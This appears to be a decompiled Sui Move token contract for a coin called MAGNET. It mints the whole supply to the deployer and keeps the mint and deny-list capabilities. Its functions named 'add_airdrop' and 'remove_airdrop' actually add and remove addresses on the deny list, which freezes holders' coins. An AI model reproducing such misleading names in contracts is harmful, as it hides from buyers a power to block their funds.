module 0xe01f4cb0ca7038711b6969b3adc9fbc8df39312e9e7e78972cfad0c3dfb78a58::MAGNET {
    struct MAGNET has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MAGNET>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MAGNET>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: MAGNET, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MAGNET>(arg0, 6, b"Magnet", b"Magnet Sui", b"MAGNET on Sui", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://movepump.com/_next/image?url=https%3A%2F%2Fapi.movepump.com%2Fuploads%2FQm_R1_M3k_HVCE_Gu_Rj_Fk_Mw3g_Tt_J_Vu_UE_946_K_Tw9_RP_Vij_Km6_Co_Y_58d60cf98e.jpg&w=640&q=75")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MAGNET>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<MAGNET>>(0x2::coin::mint<MAGNET>(&mut v3, 10000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<MAGNET>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MAGNET>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MAGNET>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MAGNET>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

